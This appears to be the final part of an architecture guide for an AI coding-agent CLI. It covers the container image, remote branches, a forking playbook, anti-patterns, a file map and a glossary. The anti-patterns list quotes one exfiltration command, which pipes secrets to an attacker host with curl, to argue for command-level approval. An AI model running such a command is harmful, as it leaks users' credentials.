Two-stage. Builder uses `rust:1.94.1-slim-bookworm` — strips binary at end. Runtime uses `python:3.13-slim-bookworm`.

Runtime adds: docker-ce-cli, gosu (for entrypoint UID drop), Python (for gcloud/azure-cli wrappers).

User: `agent` UID/GID 1000 (`/agent` workdir, `agent:docker` group). Sudo NOPASSWD only for `apt-get`/`apt`/`dpkg`/`snap` (package management) and a tiny set of `/opt/*` operations (cloud CLI installs).

CLI tools managed via **aqua** (`/home/agent/.config/aquaproj-aqua/aqua.yaml`):
- jq 1.8.1, yq 4.52.2, fzf, ripgrep, fd, bat, eza
- kubectl 1.35.0, helm 4.1.0
- terraform 1.14.4, terragrunt 0.99.1
- aws-cli 2.33.16, doctl 1.150.0
- gh 2.86.0
- trivy 0.69.1, grype 0.107.1
- k6 1.5.0, oha 1.12.1, vegeta 12.13.0

`gcloud` and `azure-cli` are wrapper scripts in `scripts/` (Python-based, not in aqua).

Tools are **lazy-loaded** by aqua on first use. To pre-warm: `docker run -v stakpak-cache:/home/agent/.local/share/aquaproj-aqua stakpak/agent sh -c "kubectl version --client && terraform version && ..."`.

### Container UID handoff

When host UID ≠ 1000, sandbox starts container with `--user 0:0` and passes `STAKPAK_TARGET_UID` / `STAKPAK_TARGET_GID` env vars. Entrypoint `scripts/entrypoint.sh` patches `/etc/passwd`, chowns writable paths, drops to target user via gosu. Avoids "world-readable secrets" workaround.

---

# PART VII — BRANCH LANDSCAPE

## 37. The 295 remote branches: counts and activity

| Prefix | Count |
|---|---|
| `fix/` | 125 |
| `feat/` | 102 |
| `refactor/` | 12 |
| `feature/` (older convention) | 12 |
| `patch/` | 11 |
| `tui/` | 4 |
| `perf/` | 4 |
| `en/` (one author's prefix) | 4 |
| `chore/` | 4 |
| `docs/` | 3 |
| `ci/` | 2 |
| `acp/` | 1 |
| `consolidate-auth-and-model-config` | 1 |
| `improve-init-banner-ux`, `optimization`, `release`, `enhancements`, etc. | 1 each |
| `main`, `beta` | 2 |

| Activity bucket | Count |
|---|---|
| < 30 days | 19 |
| 30–90 days | 128 |
| 90–180 days | 90 |
| 180–365 days | 58 |
| > 1 year | ~0 (effectively cleaned up) |

Most branches with `ahead=0, files=0` against main are **already merged via squash** — main contains their content, but the branch's commits don't appear in main's first-parent history. Don't try to revive these; they're done.

## 38. Architecturally significant in-flight branches

Eyeball these before starting any major work that overlaps — there may already be a branch you can either pull from or coordinate with.

### `feat/add-minimax-provider` — **Active, 2 days ago, +1283 lines, 19 files**

Adding MiniMax as a provider in `libs/ai/`. New files:
- `libs/ai/src/providers/minimax/{convert,mod,provider,stream,types}.rs`
- `libs/ai/tests/integration/minimax.rs`

Touches: `libs/ai/src/{client/builder,client/config,provider/dispatcher,registry/mod,providers/mod}.rs`, `libs/shared/src/models/{llm,stakai_adapter}.rs`, `cli/src/commands/auth/login.rs`, `cli/src/config/{app,profile}.rs`, `cli/src/onboarding/config_templates.rs`, README.md.

**Pattern**: this is the cleanest reference for "how to add a new provider" — it's a one-impl-of-`Provider`-trait change touching exactly the files you'd expect.

### `feat/add-openrouter-provider` — **Active, 3 days ago, +465 lines, 16 files**

Same shape as MiniMax. Adds OpenRouter as a custom provider and threads support for **custom headers in `GenerateRequest`** (last commit message: "use custom headers provided in GenerateRequest").

### `feat/persistent-shell-sessions` — **3 months ago, +4029 lines, 18 files**

The biggest in-flight architectural addition. Adds `libs/shared/src/shell_session/{local,remote,manager,session,mod}.rs` plus tests. Modifies `libs/mcp/server/src/{local_tools,tool_container}.rs` and `cli/src/config/`. Replaces the stateless `TaskManager` model with **true PTY-backed persistent shells**.

**If you're mirroring**, this is the canonical reference for stateful shell session design — shells survive across multiple `run_command` calls within a session, with persistent env vars, cwd, and shell history.

### `feat/dangerously-skip-permissions` — **3 months ago, +201 lines, 9 files**

Touches `cli/src/commands/agent/run/mode_interactive.rs`, `cli/src/main.rs`, plus TUI (`tui/src/{app,event_loop,view}.rs`, `tui/src/services/disclaimer_popup.rs`, `tui/src/services/handlers/{dialog,mod}.rs`). Adds a flag/UX to bypass approval entirely with disclaimer screen (Claude Code shape).

### `fix/hierarchical-shell-approvals` — **7 weeks ago, +411 lines, 8 files**

Refines the `shell-tool-approvals` parser/resolver. **Reference for understanding the `::`-delimited scope rule semantics**, especially the prefix-vs-exact-match distinction and the `max()` aggregation across pipeline.

### `feat/ACP` — **8 months ago, 1088 commits ahead (likely first ACP push, since merged)**

Initial Agent Client Protocol implementation for Zed editor integration. Now merged into main. The current ACP code lives in `cli/src/commands/acp/`.

### Other notable branches (likely safe-to-ignore unless researching specific topic)

- `feat/inline-mode` (9 months) — alternative inline rendering mode
- `feat/recovery-options` / `feat/recovery-options-rebased` — error-recovery UX, large
- `feat/reversible-file-tools` — earlier reference for the backup-on-remove pattern that's now in main
- `feat/linux-sandbox` — sandbox container exploration
- `feat/file-scratchpad-context-manager` — earlier landing of the third context manager
- `feat/per-request-run-overrides` / `feat/per-request-run-overrides-impl` — RunOverrides per-call scheme that's in main
- `feat/dynamic-subagents` — dynamic subagent spawning; partially in main as `dynamic_subagent_task`
- `feat/local-api-provider` / `feat/local-custom-models` — early BYOK exploration
- `feat/sandbox-mcp-proxy` — sandbox-aware MCP proxy
- `feature/openai-codex-oauth` (5 weeks) — OpenAI Codex OAuth path
- `feature/onboarding-auth-flow-refactor` — unify provider auth flow during onboarding
- `feature/ak-knowledge-store` — AK store earlier exploration
- `consolidate-auth-and-model-config` — consolidated auth + model config schema

### Branches you can safely ignore

- `fix/*` for tiny bug fixes (most of the 125)
- `chore/*`, `ci/*` — maintenance
- `docs/*` — pure documentation
- `tui/*` for cosmetic UI tweaks
- Anything `*-base`, `*-impl`, `*-rebased` — usually intermediate work that landed elsewhere

**Recommendation**: when you start your mirror, fork from `main` (currently at `0.3.78`) and pull from these spotlights selectively as references — don't try to incorporate them wholesale.

---

# PART VIII — MIRROR PLAYBOOK

## 39. The seams: what to keep

These are the trait boundaries that let you swap a behaviour without rewriting the surrounding system. **Mirroring difficulty is inversely proportional to depth** — replacing the LLM provider is one trait impl; replacing the agent loop is rewriting the kernel.

| Layer | Seam | Impl effort to swap |
|---|---|---|
| LLM backend | `stakai::Provider` (4 methods) | **1 trait impl** + register with `ProviderRegistry::register()` |
| Tool execution | `agent_core::ToolExecutor::execute_tool_call` | 1 trait impl |
| Agent observation | `agent_core::AgentHook` (5 methods, all default no-op) | 1 trait impl per concern (checkpointing, telemetry, etc.) |
| Context overflow | `agent_core::CompactionEngine::compact` | 1 trait impl (or use `PassthroughCompactionEngine`) |
| Context reduction | `agent_core::ContextReducer::reduce` | 1 trait impl (or use `Default`/`BudgetAware`) |
| Session storage | `stakpak_api::SessionStorage` (~10 methods) | 1 trait impl — swap libsql for Postgres/Redis/HTTP |
| Knowledge store backend | `stakpak_ak::StorageBackend` (~9 methods) | 1 trait impl — swap LocalFsBackend for remote/encrypted |
| Channel platform | `stakpak_gateway::Channel` (5 required + 3 default) | 1 trait impl + register in `build_channels` + add `ChannelTarget` variant |
| MCP tool | `#[tool_router(router = …)]` impl block | Add tool method, register router in `build_tool_container()` |
| TUI framework | The two mpsc channels (`InputEvent` / `OutputEvent`) | Replace `view()` + `services/` render fns; AppState is UI-framework-agnostic |
| Input device | `map_crossterm_event_to_input_event` | Replace one fn + the OS thread that polls input |

## 40. The domain: what to replace

These are domain-specific. Replace freely without touching the framework.

| Subsystem | What to swap |
|---|---|
| Tools | The whole `local_tools.rs`, `remote_tools.rs`, `subagent_tools.rs`, `integrations/` directory in `mcp/server/` |
| System prompt | `cli/src/commands/agent/run/prompts/system_prompt.v1.md` (compile-time `include_str!`) |
| Skills (compile-time prompts) | `libs/ak/src/skills/*.md` (`SKILL_USAGE`, `SKILL_RETROSPECT`, `SKILL_MAINTAIN`) |
| Rulebooks | The whole `[profiles.X.rulebooks]` config block + the `stakpak rb` command surface |
| Auto-approve defaults | `agent_core::types.rs:80-117` (`SAFE_AUTOPILOT_TOOLS`, `DEFAULT_ASK_TOOLS`, `DEFAULT_AUTO_APPROVE_TOOLS`) |
| Provider catalog | `libs/ai/src/registry/models_dev.rs` (`fetch_models_dev`, model catalog HTTP service) |
| Stakpak-specific provider | `libs/ai/src/providers/stakpak/*` (the gateway routing provider) |
| Privacy rules | `libs/shared/src/secrets/privacy_rules.toml` |
| AK directory layout | YAML frontmatter convention (`description`, `sources`, `tags`) in `libs/ak/src/format.rs` |
| Plan-mode lifecycle | `tui/src/services/plan.rs`, `PlanModeState`, `PlanReviewState` |
| Side panel content | `tui/src/services/board_tasks.rs`, `SidePanelState` |
| API endpoint URLs | `cli/src/config/mod.rs` (`STAKPAK_API_ENDPOINT`); `mcp_init.rs` (the `paks` upstream URL) |
| Container image names | `libs/shared/src/container::stakpak_agent_image` |
| Telemetry IDs | `Settings.anonymous_id`, `Settings.collect_telemetry` |

## 41. Suggested mirroring sequence

If you're starting from a fork of this repo and re-skinning, here's the order that minimises rework:

### Phase 1 — Strip Stakpak-specific identity (1–2 days)

1. Rename binary in `cli/Cargo.toml`: `name = "stakpak"` → your binary
2. Replace `cli/src/commands/agent/run/prompts/system_prompt.v1.md`
3. Update `libs/ak/src/skills/*.md` if you keep AK
4. Replace `cli/src/config/mod.rs::STAKPAK_API_ENDPOINT`
5. Decide: keep or drop `provider = "remote"` (Stakpak gateway). If drop → make `local` default and remove `stakpak` from auto-injected MCP upstreams in `mcp_init.rs`
6. Replace `assets/`, README, GETTING-STARTED, banner text
7. Tag at `0.0.1`, set up your own GH Actions secrets for Homebrew tap (or remove the homebrew job)

### Phase 2 — Re-skin the tool catalog (1–2 weeks)

1. Decide which built-in tools you keep:
   - **Almost certainly keep**: `view`, `str_replace`, `create`, `remove`, `run_command`
   - **Probably drop or reshape**: `search_docs`, `load_skill`, `local_code_search` (Stakpak indexing service); `slack_*` (delete unless you re-implement); subagent tools (only if you have an LLM-spawning use case)
2. Add your own tools: each is one method on a `#[tool_router]` impl block in `libs/mcp/server/src/`
3. Update `SAFE_AUTOPILOT_TOOLS` and `DEFAULT_AUTO_APPROVE_TOOLS` (`agent-core/src/types.rs`)
4. Update `tool_container.rs` `build_tool_container()` to compose your routers
5. Run `cargo test -p stakpak-mcp-server` to validate

### Phase 3 — Replace the LLM provider, if not Anthropic/OpenAI/Gemini (3–7 days)

Reference: see `feat/add-minimax-provider` for the canonical "add a provider" diff. Files to add:

```
libs/ai/src/providers/yourprov/{convert.rs, mod.rs, provider.rs, stream.rs, types.rs}
```

Files to touch:
```
libs/ai/src/{client/builder,client/config,provider/dispatcher,registry/mod,providers/mod}.rs
libs/shared/src/models/{llm,stakai_adapter}.rs   # add ProviderConfig variant
cli/src/commands/auth/login.rs                    # add --provider yourprov path
cli/src/config/{app,profile}.rs                   # add credential resolution
cli/src/onboarding/config_templates.rs            # add wizard template
```

Provider trait has 4 required methods; all the SSE parsing details depend on your provider's wire format.

### Phase 4 — Re-skin the channel adapters (or drop them, if no chat-platform use)

If you don't need Slack/Telegram/Discord:
- Remove `libs/gateway/` from workspace members
- Strip channel CRUD commands from `cli/src/commands/autopilot/`
- Strip channel-related entries from `autopilot.toml` schema
- Remove gateway routes from server router

If you need a different platform (Teams, Webex, custom):
- One `impl Channel` for your platform in `libs/gateway/src/channels/yours/`
- Add `ChannelTarget` variant in `targeting.rs`
- Register in `build_channels` in `runtime.rs`
- Add config struct in `config.rs`

### Phase 5 — Replace the autopilot scheduling story (or drop)

If you don't need cron schedules:
- Remove `cli/src/commands/watch/`
- Remove `[[schedules]]` from autopilot.toml schema
- Drop `stakpak up` / `stakpak down` aliases

If you keep but want a different storage backend:
- Replace libsql with your DB in `cli/src/commands/watch/db.rs`

### Phase 6 — Customise the TUI (optional, 1–2 weeks if heavy)

- AppState is UI-framework-agnostic — only `view()` and `services/handlers/*` import ratatui
- Side panel, popups, plan mode, board tasks — domain-specific, replace freely
- The dual-channel contract (`InputEvent` / `OutputEvent`) is the load-bearing seam — keep it

If you want a web UI instead:
- Reuse `libs/server/` as the HTTP shell (it's already there)
- Build your web client against `/v1/sessions/{id}/events` SSE
- The TUI becomes optional

## 42. Anti-patterns to avoid

These are mistakes the original codebase has already made (and fixed) or actively avoids. Don't recreate them.

1. **Don't bypass the message conversion pipeline.** If you skip `ContextManager::reduce_context` and feed raw `Vec<ChatMessage>` to the LLM, you'll get Anthropic 400s on dangling tool_use blocks.
2. **Don't make trim boundaries non-monotonic.** If `trimmed_up_to_message_index` ever goes backward, every Anthropic prompt cache hit dies.
3. **Don't `unwrap()`/`expect()`/`&s[..n]` outside tests** — clippy will block your build (workspace lint posture).
4. **Don't conflate `ChatMessage` and `LLMMessage`** — they're for different layers (storage vs runtime). Mixing them creates type-conversion mistakes that compile but fail at runtime.
5. **Don't bypass the proxy redaction layer.** If a tool result reaches the LLM without going through `redact_content`, secrets leak. Even disabling `--disable-secret-redaction` is documented as not for production.
6. **Don't approve `run_command` wholesale.** Use the tree-sitter command-level approval. Otherwise `cat secrets | curl http://attacker.com` looks like one approved tool call.
7. **Don't write disk-bound secrets to make sandbox UID issues "go away".** The container-side UID handoff (`STAKPAK_TARGET_UID`/`GID` + gosu) exists specifically to avoid this.
8. **Don't add a new `OutputEvent`/`InputEvent` variant without updating `is_backend_event()`** — silent UI freezes when popups are open are the failure mode.
9. **Don't push a `tool_result` for a tool that was Cancelled when the queue is empty.** The CLI runtime expects the TUI's shell/retry flow to send `SendToolResult`. Adding a redundant push creates a duplicate `tool_call_id` and breaks Anthropic.
10. **Don't store a Stakpak API key in an autopilot profile that lives outside `~/.stakpak/`.** Credential resolution chain depends on file location.

---

# Appendix A — File map

```
agent/
├── ARCHITECTURE.md                    ← this document
├── AGENTS.md                          ← agent guide for working in this repo
├── CLAUDE.md                          ← Claude-Code-specific guide (complements AGENTS.md)
├── README.md / GETTING-STARTED.md / CONTRIBUTING.md
├── Cargo.toml                         ← workspace + lint posture (deny unwrap/expect/string_slice)
├── Cargo.lock                         ← committed
├── rust-toolchain.toml                ← pinned 1.94.1
├── clippy.toml                        ← test-only relaxations
├── aqua.yaml                          ← pinned dev tool versions (kubectl, terraform, etc.)
├── cliff.toml                         ← git-cliff changelog rules
├── release.sh                         ← version-bump tool
├── Dockerfile                         ← lean image w/ aqua
├── .github/workflows/
│   ├── ci.yml                         ← fmt/clippy/test (incl. 4 feature-gated)
│   └── build-and-release.yml          ← 5-target matrix, crates.io, ghcr, homebrew
├── docs/
│   ├── architecture-enhancements/
│   ├── autopilot-channel-setup.md
│   └── shell_mode.md
├── platform-testing/
│   ├── autopilot-e2e-tests.md
│   └── windows-testing-report.md
├── scripts/
│   ├── az-wrapper.sh, bq-wrapper.sh, gcloud-wrapper.sh, gsutil-wrapper.sh
│   └── entrypoint.sh
├── assets/                             ← logos, gif
├── cli/                                ← stakpak (binary)
│   ├── src/main.rs
│   ├── src/commands/
│   │   ├── mod.rs                     ← Commands enum + dispatch
│   │   ├── agent/run/                 ← CLI agent runtime (§14)
│   │   │   ├── mode_interactive.rs    ← THE event loop
│   │   │   ├── mode_async.rs          ← headless mode
│   │   │   ├── stream.rs              ← SSE assembly
│   │   │   ├── checkpoint.rs          ← resume contract
│   │   │   ├── tooling.rs             ← run_tool_call w/ cancel race
│   │   │   ├── mcp_init.rs            ← MCP bootstrap sequence
│   │   │   ├── pause.rs, profile_switch.rs
│   │   │   ├── helpers.rs, renderer.rs, tui.rs
│   │   │   └── prompts/system_prompt.v1.md   ← compile-time prompt
│   │   ├── auth/, sessions/, ak/      ← one-shot subcommands
│   │   ├── autopilot/                 ← service install + schedule/channel CRUD
│   │   ├── watch/                     ← cron scheduler runtime
│   │   ├── mcp/                       ← mcp start, mcp proxy, mcp add/...
│   │   ├── acp/                       ← Zed integration
│   │   ├── warden.rs, board.rs, browser.rs    ← plugin wrappers
│   │   └── auto_update.rs
│   ├── src/config/
│   │   ├── file.rs (ConfigFile), profile.rs (ProfileConfig), types.rs, app.rs (AppConfig)
│   │   ├── warden.rs, rulebook.rs, models_cache.rs, profile_resolver.rs
│   └── src/onboarding/
│       ├── mod.rs, auth_flow.rs, byom.rs, menu.rs
│       ├── navigation.rs (NavResult<T>), save_config.rs, config_templates.rs
├── tui/                                ← stakpak-tui (§16)
│   └── src/
│       ├── lib.rs (run_tui), app.rs (AppState), event.rs, event_loop.rs, view.rs
│       ├── app/{events.rs, types.rs}  ← InputEvent/OutputEvent
│       └── services/handlers/         ← tool, shell, dialog, popup, ask_user, etc.
├── libs/
│   ├── shared/                        ← stakpak-shared (§9)
│   │   └── src/models/{llm.rs, stakai_adapter.rs, integrations/}
│   │   src/{secrets/, secret_manager.rs, hooks/, auth_manager.rs, oauth/, paths.rs, ...}
│   ├── api/                           ← stakpak-api (§9)
│   │   └── src/{storage.rs, models.rs, local/{storage.rs, context_managers/, hooks/, migrations/}}
│   ├── ai/                            ← stakai (§10)
│   │   └── src/{client/, types/, registry/, provider/, providers/{anthropic,openai,gemini,bedrock,copilot,stakpak,...}/, tracing.rs}
│   ├── agent-core/                    ← stakpak-agent-core (§8) — THE KERNEL
│   │   └── src/{agent.rs, types.rs, approval.rs, context.rs, budget_context.rs, tools.rs, hooks.rs, compaction.rs, error.rs, checkpoint.rs, retry.rs, stream.rs, lib.rs}
│   ├── server/                        ← stakpak-server (§11)
│   │   └── src/{routes.rs, session_manager.rs, session_actor.rs, event_log.rs, idempotency.rs, checkpoint_store.rs, message_bridge.rs, auth.rs, openapi.rs, state.rs, types.rs}
│   ├── gateway/                       ← stakpak-gateway (§12)
│   │   └── src/{runtime.rs, dispatcher.rs, router.rs, store.rs, client.rs, targeting.rs, api.rs, config.rs, channels/{slack,telegram,discord,mod}.rs, channels/slack-manifest.yaml}
│   ├── ak/                            ← stakpak-ak (§17)
│   │   └── src/{lib.rs, store.rs, search.rs, format.rs, skills.rs, skills/*.md}
│   ├── shell-tool-approvals/          ← stakpak-shell-tool-approvals (§17)
│   │   └── src/{lib.rs, parse.rs, resolver.rs, matcher.rs}
│   └── mcp/
│       ├── config/   src/lib.rs       ← McpConfigFile, CRUD
│       ├── client/   src/{lib.rs, local.rs}
│       ├── server/   src/{lib.rs, tool_container.rs, local_tools.rs, remote_tools.rs, subagent_tools.rs, integrations/slack.rs}
│       │            README.md, README_SECRETS.md
│       └── proxy/    src/{client/mod.rs, server/mod.rs}
```

# Appendix B — Glossary

- **AK** — Agent Knowledge store; local file-backed markdown library at `~/.stakpak/knowledge`
- **ACP** — Agent Client Protocol; standard for editor-agent integration (Zed)
- **AppState** — TUI top-level state struct (`tui/src/app.rs`); not serialised
- **`AppConfig`** — runtime-resolved profile config (`cli/src/config/app.rs`); merged from `profiles.all` + `profiles.<name>`
- **Autopilot** — 24/7 background daemon = scheduler + server + gateway in one process
- **Approval FSM** — `ApprovalStateMachine` in `agent-core/approval.rs`; tracks per-tool decisions in declaration order
- **Checkpoint** — persisted snapshot of `Vec<Message>` + opaque metadata; one-per-session in `~/.stakpak/server/checkpoints/{id}/latest.checkpoint`
- **Channel** — chat-platform adapter trait in `gateway` (Slack/Telegram/Discord)
- **ChatMessage** — OpenAI-shaped message format used in storage (`libs/shared/.../openai.rs`)
- **ContextManager** — strategy trait for compressing message history (`libs/api/.../context_managers/`); 3 impls: Simple, TaskBoard, FileScratchpad
- **EventLog** — per-session ring buffer + broadcast for SSE event streaming (`libs/server/event_log.rs`)
- **Gateway** — chat-platform bridge process (`stakpak-gateway`)
- **Hook** — `agent-core::AgentHook` (5 lifecycle points) OR `shared::Hook<State>` (generic priority-ordered registry)
- **`LLMMessage`** — provider-neutral message format (`libs/shared/models/llm.rs`); typed content parts
- **MCP** — Model Context Protocol; tool wire protocol (rmcp crate)
- **Profile** — named behaviour config in `~/.stakpak/config.toml`
- **`ProposedToolCall`** — kernel-level tool-call type before approval (`agent-core/types.rs`)
- **Routing key** — gateway's stable string mapping `(channel, peer, chat_type)` → session_id
- **Rulebook** — markdown SOP with YAML frontmatter; loaded into agent context
- **`run_agent`** — THE canonical agent loop function (`libs/agent-core/agent.rs`)
- **Schedule** — cron entry in `~/.stakpak/autopilot.toml`
- **Secret redaction** — gitleaks-based detection; tokens `[REDACTED_SECRET:rule:hash]`; map persisted at `.stakpak/session/secrets.json`
- **Skill** — compile-time agent prompt embedded as `&'static str` in `libs/ak/src/skills/*.md`
- **Steering** — out-of-band command sent during a run (`AgentCommand::Steering`); injected as user message at next loop top
- **`stakai`** — the LLM SDK crate (= `libs/ai`)
- **TaskManager** — background-task lifecycle in `mcp/server` for `*_task` tools
- **TUI** — terminal UI (`stakpak-tui`)
- **Warden** — Docker-based sandbox wrapper (separate plugin binary)

---

*End of ARCHITECTURE.md. Approximate length: ~3000 lines. Built from a deep file-by-file pass over `main` (~177k LOC) and a categorised survey of all 295 remote branches.*











